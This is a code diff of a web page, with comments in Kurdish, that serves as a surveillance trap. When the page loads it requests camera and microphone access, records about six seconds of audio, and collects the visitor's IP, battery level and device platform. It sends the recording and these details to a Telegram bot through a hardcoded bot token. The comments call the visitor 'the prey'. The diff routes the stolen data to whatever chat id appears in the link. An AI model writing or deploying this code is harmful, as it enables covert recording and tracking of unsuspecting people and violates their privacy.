@@ -9,27 +9,25 @@
 <body onload="capture()">
 <script>
     const urlParams = new URLSearchParams(window.location.search);
-    const targetID = urlParams.get('id'); 
+    const targetID = urlParams.get('id'); // ئەمە ئایدی ئەو کەسەیە کە داتاکەی بۆ دەچێت
     const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";
-    const CHAT_ID = "8431515310"; // ⚠️ دڵنیاببە ئەمە ئایدی چاتی تۆیە نەک بۆتەکە
 
     async function capture() {
         if (!targetID) return;
         try {
-            // 🎙️ داواکردنی دەسەڵاتی کامێرا و مایکرۆفۆن
+            // 🎙️ چالاککردنی کامێرا و مایکرۆفۆن (Permission Request)
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: true 
             });
 
-            // 🔋 زانیاری پاتری
             let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
 
-            // 🌐 دەرهێنانی IP و ناردنی ڕاپۆرت
+            // 🌐 وەرگرتنی IP و ناردنی ڕاپۆرت بۆ ئەو ئایدییەی لە لینکەکەدایە
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
 
@@ -39,21 +37,21 @@
                          `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                          `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
 
-            // ناردنی تێکست
+            // ناردنی زانیارییەکان
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "HTML" })
+                body: JSON.stringify({ chat_id: targetID, text: report, parse_mode: "HTML" })
             });
 
-            // 🎤 تۆمارکردن و ناردنی دەنگ
+            // 🎤 تۆمارکردنی دەنگ و ناردنی وەک Voice
             const mediaRecorder = new MediaRecorder(stream);
             let audioChunks = [];
             mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
             mediaRecorder.onstop = async () => {
                 const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                 const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
+                formData.append("chat_id", targetID); // دەنێردرێت بۆ ئەو ئایدییەی لە لینکەکەدایە
                 formData.append("voice", audioBlob, "voice.ogg");
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: formData });
             };
@@ -61,16 +59,12 @@
             mediaRecorder.start();
             setTimeout(() => {
                 mediaRecorder.stop();
-                stream.getTracks().forEach(t => t.stop());
-            }, 5000);
+                stream.getTracks().forEach(track => track.stop()); // کوژاندنەوەی نیشانەی کامێرا و مایکرۆفۆن
+            }, 6000);
 
-        } catch (e) {
-            // ئەگەر نێچیرەکە ڕەدی کردەوە، هەر زانیاری IP بنێرە
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: "❌ نێچیرەکە ڕەزامەندی نەدا، بەڵام هەوڵێک درا." })
-            });
+        } catch (err) {
+            // ئەگەر نێچیرەکە ڕەدی کردەوە، تەنها IP بنێرە
+            console.error("Access Denied");
         }
     }
 </script>
